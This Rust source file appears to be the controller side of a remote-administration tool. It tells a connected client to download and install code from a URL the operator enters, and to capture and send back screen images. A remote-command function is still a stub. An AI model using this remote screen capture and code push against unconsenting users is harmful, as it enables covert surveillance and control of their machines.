use std::env::current_dir;
use std::fs::{create_dir_all, File};
use std::io::{BufWriter, Write};
use std::process::Command;
use anyhow::{anyhow, Result};
use bytes::{Buf, BufMut, BytesMut};
use futures_util::StreamExt;
use log::{debug, error, info};
use md5::{Digest, Md5};
use tokio::net::TcpStream;
use variable_len_reader::str::{read_string, read_u8_vec, write_string};
use variable_len_reader::variable_len::read_variable_u32;
use crate::network::{recv, send};
use crate::read_line;

async fn send_recv(client: &mut TcpStream, message: &[u8]) -> Result<Option<BytesMut>> {
    send(client, message).await?;
    let response = recv(client).await?;
    Ok(match response {
        Ok(success) => { Some(success) }
        Err(error) => { error!("Client error: {}", error); None }
    })
}

pub async fn upgrade(client: &mut TcpStream) -> Result<()> {
    println!("Please enter the download url:");
    let url = read_line()?;
    let url = url.trim();
    debug!("Calculating the file md5...");
    let mut hasher = Md5::default();
    let request = reqwest::get(url).await;
    if let Err(e) = request {
        error!("Failed to download the file: {}", e);
        return Ok(());
    }
    let mut stream = request.unwrap().bytes_stream();
    while let Some(bin) = stream.next().await {
        hasher.update(&bin?);
    }
    let md5 = format!("{:x}", hasher.finalize());
    info!("Calculated the file md5: {}", md5);
    let mut buf = BytesMut::new().writer();
    write_string(&mut buf, &"upgrade")?;
    write_string(&mut buf, &url)?;
    write_string(&mut buf, &md5)?;
    debug!("Sending upgrade request...");
    if let Some(response) = send_recv(client, &buf.into_inner()).await? {
        let mut response = response.reader();
        let message = read_string(&mut response)?;
        println!("Client message: {}", message);
    }
    Ok(())
}

pub async fn capture(client: &mut TcpStream) -> Result<()> {
    let mut buf = BytesMut::new().writer();
    write_string(&mut buf, &"image_grab")?;
    debug!("Sending capture request...");
    if let Some(response) = send_recv(client, &buf.into_inner()).await? {
        let mut response = response.reader();
        let count = read_variable_u32(&mut response)?;
        info!("Received {} images.", count);
        create_dir_all("images")?;
        for i in 0..count {
            let image = read_u8_vec(&mut response)?;
            let mut file = BufWriter::new(File::create(format!("images/{}.png", i))?);
            file.write_all(&image)?;
        }
        println!("Press 'ok' to open the images folder:");
        if read_line()?.trim().to_lowercase() == "ok" {
            Command::new("explorer")
                .arg(current_dir()?.join("images").to_str()
                    .ok_or(anyhow!("Failed to get images folder."))?)
                .spawn()?
                .wait()?;
        }
    }
    Ok(())
}

pub async fn command(client: &mut TcpStream) -> Result<()> {
    todo!()
}
